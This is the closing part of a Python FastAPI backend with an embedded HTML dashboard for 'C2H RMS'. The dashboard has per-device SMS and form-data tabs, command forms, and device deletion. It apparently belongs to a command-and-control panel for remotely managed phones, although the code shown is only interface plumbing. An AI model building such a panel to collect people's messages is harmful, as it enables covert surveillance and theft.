            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            
            if (tab === 'sms') {
                document.querySelectorAll('.tab')[0].classList.add('active');
                document.getElementById('smsTab').classList.add('active');
            } else {
                document.querySelectorAll('.tab')[1].classList.add('active');
                document.getElementById('formsTab').classList.add('active');
            }
        }
        
        // डिवाइस डिलीट करें
        async function deleteDevice() {
            if (!confirm('Are you sure you want to delete this device? All data will be permanently lost!')) {
                return;
            }
            
            try {
                const res = await fetch(`/api/device/${currentDeviceId}`, {
                    method: 'DELETE'
                });
                
                if (res.ok) {
                    alert('✅ Device deleted successfully');
                    closeModal();
                    loadDevices();
                }
            } catch (error) {
                alert('❌ Error deleting device');
            }
        }
        
        // मोडल बंद करें
        function closeModal() {
            document.getElementById('deviceModal').style.display = 'none';
            document.getElementById('commandFormContainer').innerHTML = '';
            currentDeviceId = null;
        }
        
        // मोडल के बाहर क्लिक करने पर बंद करें
        window.onclick = function(event) {
            const modal = document.getElementById('deviceModal');
            if (event.target === modal) {
                closeModal();
            }
        }
        
        // पेज छोड़ते समय इंटरवल साफ करें
        window.onbeforeunload = function() {
            if (refreshInterval) {
                clearInterval(refreshInterval);
            }
        };
    </script>
</body>
</html>
    """)

@app.get("/status", response_class=HTMLResponse, include_in_schema=False)
async def status_check():
    return """
    <!DOCTYPE html><html><head><title>C2H RMS Status</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background-color:#121212;color:#fff}.container{text-align:center;padding:40px;border-radius:15px;background-color:#1e1e1e;box-shadow:0 10px 25px rgba(0,0,0,0.5)}h1{color:#00bfff;margin-bottom:10px}p{color:#b0b0b0}a{color:#7b1fa2}</style></head><body><div class="container"><h1>✅ C2H RMS Backend is Running</h1><p>The server is deployed and fully operational.</p><p>API Documentation available at <a href="/docs">/docs</a>.</p></div></body></html>
    """

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
